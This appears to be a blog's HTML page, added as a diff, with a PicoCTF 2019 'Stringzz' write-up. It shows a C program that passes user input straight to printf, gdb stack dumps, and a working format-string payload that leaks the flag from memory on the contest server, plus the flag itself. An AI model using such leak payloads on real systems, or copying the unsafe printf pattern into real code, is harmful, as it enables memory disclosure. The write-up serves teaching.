@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="generator" content="Hugo 0.80.0" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://shiny-labs.re/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://shiny-labs.re/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://shiny-labs.re/favicon-16x16.png">
+    <link rel="manifest" href="https://shiny-labs.re/site.webmanifest">
+    <link rel="mask-icon" href="https://shiny-labs.re/safari-pinned-tab.svg" color="#000000">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="theme-color" content="#ffffff">
+
+
+    <link rel="stylesheet" href="https://shiny-labs.re/css/bulma.min.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/main.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/syntax.css">
+
+    
+    <title>shiny-labs || PicoCTF 2019 - Stringzz</title>
+</head>
+<body><nav class="navbar" role="navigation" aria-label="main navigation">
+    <div class="navbar-brand">
+        <a class="navbar-item no-squiggly" href="https://shiny-labs.re/">
+            <h1 id="logo" class="glitch">shiny-labs</h1>
+        </a>
+    </div>
+
+    <div class="navbar-menu">
+        <div class="navbar-start">
+            
+        </div>
+
+        <div class="navbar-end">
+            
+            <h3 id="subtitle">Exploit, reverse engineering and cats.</h3>
+        </div>
+    </div>
+</nav>
+
+<div id="content">
+
+            <div class="columns is-centered">
+                <div class="column is-three-fifths" id="menu-column"><div id="menu" class="tabs is-centered is-medium">
+    <ul>
+            <li><a href="https://shiny-labs.re/" class="no-squiggly">Home</a></li>
+            <li><a href="https://shiny-labs.re/archives/" class="no-squiggly">Archives</a></li>
+            <li><a href="https://shiny-labs.re/tags/" class="no-squiggly">Tags</a></li>
+            <li><a href="https://shiny-labs.re/about/" class="no-squiggly">About</a></li>
+  </ul>
+</div>
+
+<div class="columns">
+<div class="column is-10" id="main-column">
+    <article class="article">
+        <div >
+            <h1 class="article-title">PicoCTF 2019 - Stringzz</h1>
+            
+<div class="post-meta">
+  <p class="article-meta">
+  <span>Date</span> &#x5b;
+  <time datetime="March 29, 2020">
+      Mar 29
+    </time>
+  &#x5d;
+        
+        
+  <span>Categories</span> &#x5b;
+    <a href="https://shiny-labs.re/categories/ctf">CTF</a>
+  &#x5d;
+        
+        
+  <span>Tags</span> &#x5b;
+    <a href="https://shiny-labs.re/tags/exploit">exploit</a>
+    <a href="https://shiny-labs.re/tags/formatstring">formatString</a>
+  &#x5d;
+  </p>
+</div>
+
+        </div>
+        <div>
+            <h1 id="description">Description</h1>
+<blockquote>
+<p>Use a format string to pwn this program and get a flag. Its also found in /problems/stringzz_6_5f0e31bfd7b9a7c6a32d22b6d57e9010 on the shell server. Source.</p>
+</blockquote>
+<p>Hint: <a href="http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf">http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf</a></p>
+<h1 id="solution">Solution</h1>
+<p>Let&rsquo;s check the source code first:</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="cp">#define FLAG_BUFFER 128
+</span><span class="cp">#define LINE_BUFFER_SIZE 2000
+</span><span class="cp"></span>
+<span class="kt">void</span> <span class="nf">printMessage3</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">in</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;will be printed:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="n">in</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="kt">void</span> <span class="nf">printMessage2</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">in</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;your input &#34;</span><span class="p">);</span>
+  <span class="n">printMessage3</span><span class="p">(</span><span class="n">in</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">printMessage1</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">in</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Now &#34;</span><span class="p">);</span>
+  <span class="n">printMessage2</span><span class="p">(</span><span class="n">in</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;input whatever string you want; then it will be printed back:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">read</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">len</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">input</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">getline</span><span class="p">(</span><span class="o">&amp;</span><span class="n">input</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+    <span class="c1">//There is no win function, but the flag is wandering in the memory!
+</span><span class="c1"></span>    <span class="kt">char</span> <span class="o">*</span> <span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">FLAG_BUFFER</span><span class="p">);</span>
+    <span class="n">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span><span class="s">&#34;r&#34;</span><span class="p">);</span>
+    <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">FLAG_BUFFER</span><span class="p">,</span><span class="n">f</span><span class="p">);</span>
+    <span class="n">printMessage1</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>
+    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+
+<span class="p">}</span>
+</code></pre></div><ol>
+<li>The user input is retrieved with <code>getline()</code> and stored in the variable <code>input</code>.</li>
+<li><code>flag.txt</code> is read and its content is stored in <code>buf</code>, ie the flag is stored in <code>buf</code>.</li>
+<li>printMessage1() is called with the user input
+<ul>
+<li>which calls printMessage2()
+<ul>
+<li>which calls printMessage3()
+<ul>
+<li>which finally calls printf()</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<p>To sum up, the binary asks for a string and then gives it to printf, without any kind of modifications. That means, it&rsquo;s vulnerable to a class of attacks called format-string attacks. For example, we can use <code>%p</code> to print a pointer address in hexadecimal: (or several %p and a <code>|</code> to separate the addresses).</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ ./vuln
+input whatever string you want<span class="p">;</span> <span class="k">then</span> it will be printed back:
+
+%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>%p<span class="p">|</span>
+Now
+your input
+will be printed:
+
+0xa<span class="p">|</span>0xf7d7836b<span class="p">|</span>0x5664a6f9<span class="p">|</span>0xf7ee6000<span class="p">|</span>0x5664bfb4<span class="p">|</span>0xffde2358<span class="p">|</span>0x5664a755<span class="p">|</span>0x57d77a00<span class="p">|</span>0x5664a995<span class="p">|</span>0xf7d7836b<span class="p">|</span>0x5664a731<span class="p">|</span>0xf7ee6000<span class="p">|</span>0x5664bfb4<span class="p">|</span>0xffde2378<span class="p">|</span>0x5664a78e<span class="p">|</span>0x57d77a00<span class="p">|</span>0x5664a993<span class="p">|</span>0xf7d7681b<span class="p">|</span>0x5664a76a<span class="p">|</span>0xf7ee6000<span class="p">|</span>0x5664bfb4<span class="p">|</span>0xffde23c8<span class="p">|</span>0x5664a84d<span class="p">|</span>0x57d77a00<span class="p">|</span>0x80<span class="p">|</span>0x57d77c20<span class="p">|</span>0x5664a7ae<span class="p">|</span>0xf7ee6000<span class="p">|</span>0xf7ee6000<span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span>0xffde2474<span class="p">|</span>0xf7ee63fc<span class="p">|</span>0x5664bfb4<span class="p">|</span>0xffde247c<span class="p">|</span>0x182<span class="p">|</span>0x57d77a00<span class="p">|</span>0x57d77b90<span class="p">|</span>0x57d77c20<span class="p">|</span>0x3ee39300<span class="p">|</span>0xffde23e0<span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span>0xf7d29e81<span class="p">|</span>0xf7ee6000<span class="p">|</span>0xf7ee6000<span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span>0xf7d29e81<span class="p">|</span>0x1<span class="p">|</span>0xffde2474<span class="p">|</span>0xffde247c<span class="p">|</span>0xffde2404<span class="p">|</span>0x1<span class="p">|</span>0xffde2474<span class="p">|</span>0xf7ee6000<span class="p">|</span>0xf7f0d75a<span class="p">|</span>0xffde2470<span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span>0xf7ee6000<span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span>0x7c9dc664<span class="p">|</span>0x65e68074<span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span>0x40<span class="p">|</span>0xf7f25024<span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span>0xf7f0d869<span class="p">|</span>0x5664bfb4<span class="p">|</span>0x1<span class="p">|</span>0x5664a5b0<span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span>0x5664a5e1<span class="p">|</span>0x5664a797<span class="p">|</span>0x1<span class="p">|</span>0xffde2474<span class="p">|</span>0x5664a890<span class="p">|</span>0x5664a8f0<span class="p">|</span>0xf7f0d9b0<span class="p">|</span>0xffde246c<span class="p">|</span>0xf7f25940<span class="p">|</span>0x1<span class="p">|</span>0xffde27ce<span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span>0xffde27d5<span class="p">|</span>0xffde2dc1<span class="p">|</span>0xffde2df5<span class="p">|</span>0xffde2e17<span class="p">|</span>0xffde2e24<span class="p">|</span>0xffde2e37<span class="p">|</span>0xffde2e42<span class="p">|</span>0xffde2e7c<span class="p">|</span>0xffde2e8d<span class="p">|</span>0xffde2eb0<span class="p">|</span>0xffde2ef1<span class="p">|</span>0xffde2f05<span class="p">|</span>0xffde2f1a<span class="p">|</span>0xffde2f2d<span class="p">|</span>0xffde2f3d<span class="p">|</span>0xffde2f45<span class="p">|</span>0xffde2f53<span class="p">|</span>0xffde2fc8<span class="p">|</span>0xffde2fe8<span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span>0x20<span class="p">|</span>0xf7efd070<span class="p">|</span>0x21<span class="p">|</span>0xf7efc000<span class="p">|</span>0x10<span class="p">|</span>0x1f8bfbff<span class="p">|</span>0x6<span class="p">|</span>0x1000<span class="p">|</span>0x11<span class="p">|</span>0x64<span class="p">|</span>0x3<span class="p">|</span>0x5664a034<span class="p">|</span>0x4<span class="p">|</span>0x20<span class="p">|</span>0x5<span class="p">|</span>0x9<span class="p">|</span>0x7<span class="p">|</span>0xf7efe000<span class="p">|</span>0x8<span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span>0x9<span class="p">|</span>0x5664a5b0<span class="p">|</span>
+
+</code></pre></div><p>And we can print a huge chunk of a stack with this method! But&hellip; where&rsquo;s the flag though?</p>
+<p>Create a dummy <code>flag.txt</code> on our host so that we can poke the binary in gdb:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ <span class="nb">echo</span> <span class="s2">&#34;picoCTF{s3cr3t}&#34;</span> &gt; flag.txt
+$ gdb vuln
+</code></pre></div><p>Next, we put a breakpoint on <code>printMessage3()</code> and examine the stack. We are looking for our fake flag <code>picoCTF{s3cr3t}</code>&hellip;</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">gef➤  b printMessage3
+gef➤  telescope 40
+0xffffc660│+0x0000: 0x565585b0  →  &#34;%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p[...]&#34;	 ← $esp
+0xffffc664│+0x0004: 0x0000000a
+0xffffc668│+0x0008: 0x00000004
+0xffffc66c│+0x000c: 0x565556f9  →  &lt;printMessage3+12&gt; add ebx, 0x18bb
+0xffffc670│+0x0010: 0xf7f63e24  →  0x001e4d2c
+0xffffc674│+0x0014: 0x56556fb4  →  0x00001ebc
+0xffffc678│+0x0018: 0xffffc698  →  0xffffc6b8  →  0xffffc708  →  0x00000000	 ← $ebp
+0xffffc67c│+0x001c: 0x56555755  →  &lt;printMessage2+48&gt; add esp, 0x10
+0xffffc680│+0x0020: 0x565585b0  →  &#34;%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p[...]&#34;
+0xffffc684│+0x0024: 0x56555995  →  &#34;flag.txt&#34;
+0xffffc688│+0x0028: 0x56555993  →  0x6c660072 (&#34;r&#34;?)
+0xffffc68c│+0x002c: 0x56555731  →  &lt;printMessage2+12&gt; add eax, 0x1883
+0xffffc690│+0x0030: 0xf7f63e24  →  0x001e4d2c
+0xffffc694│+0x0034: 0x56556fb4  →  0x00001ebc
+0xffffc698│+0x0038: 0xffffc6b8  →  0xffffc708  →  0x00000000
+0xffffc69c│+0x003c: 0x5655578e  →  &lt;printMessage1+48&gt; add esp, 0x10
+0xffffc6a0│+0x0040: 0x565585b0  →  &#34;%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p[...]&#34;
+0xffffc6a4│+0x0044: 0x56555993  →  0x6c660072 (&#34;r&#34;?)
+0xffffc6a8│+0x0048: 0x00000001
+0xffffc6ac│+0x004c: 0x5655576a  →  &lt;printMessage1+12&gt; add eax, 0x184a
+0xffffc6b0│+0x0050: 0xf7f63e24  →  0x001e4d2c
+0xffffc6b4│+0x0054: 0x56556fb4  →  0x00001ebc
+0xffffc6b8│+0x0058: 0xffffc708  →  0x00000000
+0xffffc6bc│+0x005c: 0x5655584d  →  &lt;main+182&gt; add esp, 0x10
+0xffffc6c0│+0x0060: 0x565585b0  →  &#34;%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p[...]&#34;
+0xffffc6c4│+0x0064: 0x00000080
+0xffffc6c8│+0x0068: 0x56558ad0  →  0xfbad2488
+0xffffc6cc│+0x006c: 0x565557ae  →  &lt;main+23&gt; add ebx, 0x1806
+0xffffc6d0│+0x0070: 0xf7f63e24  →  0x001e4d2c
+0xffffc6d4│+0x0074: 0xf7fe1e50  →  &lt;_dl_fini+0&gt; endbr32
+0xffffc6d8│+0x0078: 0x00000000
+0xffffc6dc│+0x007c: 0xffffc7b4  →  0xffffc9e7  →  &#34;/home/kylma/ctf/00_picoctf_2019/binary_exploitatio[...]&#34;
+0xffffc6e0│+0x0080: 0xf7f643bc  →  0xf7f658c0  →  0x00000000
+0xffffc6e4│+0x0084: 0x56556fb4  →  0x00001ebc
+0xffffc6e8│+0x0088: 0xffffc7bc  →  0xffffca2d  →  &#34;LESS=-R&#34;
+0xffffc6ec│+0x008c: 0x00000078 (&#34;x&#34;?)
+0xffffc6f0│+0x0090: 0x565585b0  →  &#34;%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p[...]&#34;
+0xffffc6f4│+0x0094: 0x56558a40  →  &#34;picoCTF{s3cr3t}\n&#34;
+0xffffc6f8│+0x0098: 0x56558ad0  →  0xfbad2488
+0xffffc6fc│+0x009c: 0x54bfff00
+</code></pre></div><p>Found it? It&rsquo;s at address <code>0xffffc6f4</code>! Let&rsquo;s try to see if we can generate an input that prints that address&hellip;</p>
+<p>Our format string is stored at address <code>0xffffc660</code> and we want to get to address <code>0xffffc6f0</code>, and divide by 4 because an address is 4 bytes:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="o">&gt;&gt;&gt;</span> <span class="p">(</span><span class="mh">0xffffc6f4</span><span class="o">-</span><span class="mh">0xffffc660</span><span class="p">)</span> <span class="o">//</span> <span class="mi">4</span>
+<span class="mi">37</span>
+</code></pre></div><p>With an input generated with <code>python -c &quot;print('%p|'*37)&quot;</code>, we get the following output:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">0xa<span class="p">|</span>0x4<span class="p">|</span>0x565556f9<span class="p">|</span>0xf7f63e24<span class="p">|</span>0x56556fb4<span class="p">|</span>0xffffc698<span class="p">|</span>0x56555755<span class="p">|</span>0x565585b0<span class="p">|</span>0x56555995<span class="p">|</span>0x56555993<span class="p">|</span>0x56555731<span class="p">|</span>0xf7f63e24<span class="p">|</span>0x56556fb4<span class="p">|</span>0xffffc6b8<span class="p">|</span>0x5655578e<span class="p">|</span>0x565585b0<span class="p">|</span>0x56555993<span class="p">|</span>0x1<span class="p">|</span>0x5655576a<span class="p">|</span>0xf7f63e24<span class="p">|</span>0x56556fb4<span class="p">|</span>0xffffc708<span class="p">|</span>0x5655584d<span class="p">|</span>0x565585b0<span class="p">|</span>0x80<span class="p">|</span>0x56558ad0<span class="p">|</span>0x565557ae<span class="p">|</span>0xf7f63e24<span class="p">|</span>0xf7fe1e50<span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span>0xffffc7b4<span class="p">|</span>0xf7f643bc<span class="p">|</span>0x56556fb4<span class="p">|</span>0xffffc7bc<span class="p">|</span>0x78<span class="p">|</span>0x565585b0<span class="p">|</span>0x56558a40<span class="p">|</span>
+</code></pre></div><p>And 0x56558a40 is the address of the string containing <code>picoCTF{s3cr3t}</code> /o/</p>
+<p>What if we want to print the <em>content</em> of that last address instead of just showing the value of the pointer? We need to change modifiers! Instead of <code>%p</code> for pointers, try with a <code>%s</code> (for strings) on the last modifiers. With our new format string: <code>python -c &quot;print('%p|'*36+'%s')&quot;</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">gef➤
+0xa<span class="p">|</span>0x4<span class="p">|</span>0x565556f9<span class="p">|</span>0xf7f63e24<span class="p">|</span>0x56556fb4<span class="p">|</span>0xffffc698<span class="p">|</span>0x56555755<span class="p">|</span>0x565585b0<span class="p">|</span>0x56555995<span class="p">|</span>0x56555993<span class="p">|</span>0x56555731<span class="p">|</span>0xf7f63e24<span class="p">|</span>0x56556fb4<span class="p">|</span>0xffffc6b8<span class="p">|</span>0x5655578e<span class="p">|</span>0x565585b0<span class="p">|</span>0x56555993<span class="p">|</span>0x1<span class="p">|</span>0x5655576a<span class="p">|</span>0xf7f63e24<span class="p">|</span>0x56556fb4<span class="p">|</span>0xffffc708<span class="p">|</span>0x5655584d<span class="p">|</span>0x565585b0<span class="p">|</span>0x80<span class="p">|</span>0x56558ad0<span class="p">|</span>0x565557ae<span class="p">|</span>0xf7f63e24<span class="p">|</span>0xf7fe1e50<span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span>0xffffc7b4<span class="p">|</span>0xf7f643bc<span class="p">|</span>0x56556fb4<span class="p">|</span>0xffffc7bc<span class="p">|</span>0x78<span class="p">|</span>0x565585b0<span class="p">|</span>picoCTF<span class="o">{</span>s3cr3t<span class="o">}</span>
+</code></pre></div><p>Hooray, it works on our host! But that doesn&rsquo;t give us the real flag though&hellip;</p>
+<p>Let&rsquo;s run the same thing on the picoctf&rsquo;s server:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">kylma@pico-2019-shell1:/problems/stringzz_6_5f0e31bfd7b9a7c6a32d22b6d57e9010$ python -c <span class="s2">&#34;print(&#39;%p|&#39;*36+&#39;%s&#39;)&#34;</span> <span class="p">|</span> ./vuln
+input whatever string you want<span class="p">;</span> <span class="k">then</span> it will be printed back:
+
+Now
+your input
+will be printed:
+
+0xa<span class="p">|</span>0xf7e3f36b<span class="p">|</span>0x565a16f9<span class="p">|</span>0xf7fad000<span class="p">|</span>0x565a2fb4<span class="p">|</span>0xff8b0aa8<span class="p">|</span>0x565a1755<span class="p">|</span>0x57a1c570<span class="p">|</span>0x565a1995<span class="p">|</span>0xf7e3f36b<span class="p">|</span>0x565a1731<span class="p">|</span>0xf7fad000<span class="p">|</span>0x565a2fb4<span class="p">|</span>0xff8b0ac8<span class="p">|</span>0x565a178e<span class="p">|</span>0x57a1c570<span class="p">|</span>0x565a1993<span class="p">|</span>0xf7e3d81b<span class="p">|</span>0x565a176a<span class="p">|</span>0xf7fad000<span class="p">|</span>0x565a2fb4<span class="p">|</span>0xff8b0b18<span class="p">|</span>0x565a184d<span class="p">|</span>0x57a1c570<span class="p">|</span>0x80<span class="p">|</span>0x57a1d690<span class="p">|</span>0x565a17ae<span class="p">|</span>0xf7fad000<span class="p">|</span>0xf7fad000<span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span>0xff8b0bc4<span class="p">|</span>0xf7fad3fc<span class="p">|</span>0x565a2fb4<span class="p">|</span>0xff8b0bcc<span class="p">|</span>0x78<span class="p">|</span>0x57a1c570<span class="p">|</span>picoCTF<span class="o">{</span>str1nG_CH3353_0814bc7c<span class="o">}</span>
+</code></pre></div><p>Flag: <code>picoCTF{str1nG_CH3353_0814bc7c}</code></p>
+<p><img src="cat_string.gif" alt=""></p>
+
+        </div>
+    </article>
+</div>
+
+
+<div class="column" id="toc-column">    <aside>
+        <div id="toc">
+            What's on this page?
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#solution">Solution</a></li>
+  </ul>
+</nav>
+        </div>
+    </aside>
+
+</div>
+
+</div></div>
+            </div><footer class="footer">
+  <div class="content has-text-centered">
+    <p>
+        <div class="copyright">
+        
+            Handcrafted with <span style="color: #e25555;">&hearts;</span> by kylma
+        
+        </div>
+
+    </p>
+  </div>
+
+  <div id="to-top">
+    <a href="#logo" class="top-btn no-squiggly">^</a>
+  </div>
+
+</footer>
+</div>
+    </body>
+</html>
